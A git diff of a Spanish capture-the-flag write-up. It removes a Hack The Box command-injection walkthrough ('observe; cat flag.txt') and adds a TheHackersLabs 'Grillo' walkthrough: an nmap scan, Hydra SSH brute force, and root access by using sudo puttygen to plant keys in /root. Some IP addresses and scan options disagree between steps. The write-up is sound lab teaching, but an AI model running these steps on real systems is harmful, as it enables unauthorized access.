@@ -13,46 +13,96 @@ Plataforma: `The Hackers Labs`
 
 Dificultad: <font color='green'>Principiante</font>
 
-# Descripción
+# Reconocimiento
 
-En el corazón de la bulliciosa capital de Valeria, la taberna Rayo de Luna se erige como un animado centro de susurros, apuestas y tratos ilícitos. Bajo las risas de los clientes borrachos y el tintineo de las jarras, se dice que la taberna alberga algo más que cerveza y alegría: es un punto de encuentro secreto para espías, ladrones y leales a la causa de Malakar. La Comunidad se ha enterado de que en las trastiendas ocultas de la Taberna Rayo de Luna se intercambia una información crucial: la ubicación del Cartógrafo Velo de Sombra, un informante que posee un mapa perdido hace mucho tiempo en el que se detallan las defensas de la fortaleza de Malakar. Si la hermandad quiere tener alguna posibilidad de entrar en la Ciudadela de Obsidiana, debe obtener este mapa antes de que caiga en manos enemigas.
+En esta etapa inicial realizamos un escaneo de puertos para identificar los servicios activos en la máquina objetivo. Utilizamos `Nmap` con parámetros específicos para lograr un análisis más detallado.
 
-# Sinopsis
+```bash
+sudo nmap -p- --open -sS -sCV --min-rate 3000 -Pn -n -oN grillo.txt 192.168.100.7 
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-03 19:35 -03
+Nmap scan report for 192.168.100.7
+Host is up (0.00097s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
+| ssh-hostkey: 
+|   256 9c:e0:78:67:d7:63:23:da:f5:e3:8a:77:00:60:6e:76 (ECDSA)
+|_  256 4b:30:12:97:4b:5c:47:11:3c:aa:0b:68:0e:b2:01:1b (ED25519)
+80/tcp open  http    Apache httpd 2.4.57 ((Debian))
+|_http-title: Apache2 Debian Default Page: It works
+|_http-server-header: Apache/2.4.57 (Debian)
+MAC Address: 00:0C:29:51:25:FE (VMware)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
-Whispers of the Moonbeam es un reto web de nivel muy fácil. Descubriremos que los comandos en la terminal son instrucciones del sistema, así que ejecutaremos una inyección de comandos y conseguiremos la bandera.
-
-## Habilidades requeridas
-
-- Conocimientos de comandos Linux
-
-## Habilidades aprendidas
-
-- Inyección de comandos
-
-# Solución
-
-Cuando visitamos el sitio, nos recibe una aplicación de terminal que acepta comandos.
-
-![](/htb/cyber-apocalypse/whispers-of-the-moonbeam/index.png)
-
-![](/htb/cyber-apocalypse/whispers-of-the-moonbeam/gossip.png)
-
-![](/htb/cyber-apocalypse/whispers-of-the-moonbeam/injection.png)
-
-Tecleando comandos como `gossip`, `observe` y `examine` nos proporcionará aparentemente salidas de comandos de linux, indicando que está ejecutando comandos del sistema. También hay una sugerencia para usar `;` para la inyección de comandos.
-
-![](/htb/cyber-apocalypse/whispers-of-the-moonbeam/gossip.png)
-
-![](/htb/cyber-apocalypse/whispers-of-the-moonbeam/observe.png)
-
-![](/htb/cyber-apocalypse/whispers-of-the-moonbeam/examine.png)
-
-Vemos el `flag.txt` en el comando `gossip`, podemos usar inyección de comando para `cat flag.txt`, usando este payload:
-
-```sh
-observe; cat flag.txt
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 12.13 seconds
 ```
 
-¡Y conseguimos la bandera!
+**Detalles del comando:**
 
-![](/htb/cyber-apocalypse/whispers-of-the-moonbeam/flag.png)
+- `-p-`: Escaneo de todos los puertos.
+- `--open`: Muestra solo puertos abiertos.
+- `-sS`: Escaneo SYN para determinar el estado de los puertos.
+- `-sCV`: Usa scripts por defecto y detectar versiones de servicios.
+- `--min-rate 5000`: Establece un ritmo mínimo de escaneo.
+- `-n`: Desactiva la resolución DNS.
+- `-Pn`: Omite la detección de hosts activos.
+- `-oN Escaneo`: Guarda los resultados en el archivo "Escaneo".
+
+**Puertos descubiertos:**
+
+- 22/tcp - SSH (OpenSSH 9.2p1)
+- 80/tcp - HTTP (Apache 2.4.57)
+
+---
+
+## Fase 2 - Exploración Web
+
+Ingresamos al sitio mediante el navegador accediendo a la IP descubierta en el escaneo. Nos encontramos con la página por defecto de Apache en Debian. Revisando el código fuente de la página, encontramos una pista interesante:
+
+> "Cambia la contraseña de ssh por favor melanie."
+
+---
+
+## Fase 3 - Explotación
+
+Aplicamos fuerza bruta al servicio SSH usando el usuario `melanie` y el diccionario `rockyou.txt`:
+
+```bash
+hydra -l melanie -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.3 -F
+```
+
+Se encuentra la contraseña válida: **trustno1**
+
+---
+
+## Fase 4 - Escalada de Privilegios
+
+Una vez dentro de la máquina, verificamos permisos con:
+
+```bash
+sudo -l
+```
+
+Descubrimos que podemos ejecutar `puttygen` como root.
+
+### Uso de puttygen para escalar
+
+Puttygen se utiliza para generar claves SSH. Generamos una clave para root con los siguientes pasos:
+
+```bash
+puttygen -t rsa -b 2048 -O private-openssh -o ~/.ssh/id
+puttygen -L ~/.ssh/id >> ~/.ssh/authorized_keys
+sudo puttygen /home/melanie/.ssh/id -o /root/.ssh/id
+sudo puttygen /home/melanie/.ssh/id -o /root/.ssh/authorized_keys -O public-openssh
+scp melanie@192.168.1.3:/home/melanie/.ssh/id .
+ssh -i id root@192.168.1.3
+```
+
+Con esto obtenemos acceso completo como root.
+
+---
+
+## 🎉 ¡Root conseguido!
+
+Hemos completado exitosamente la máquina **Grillo** de TheHackersLabs.
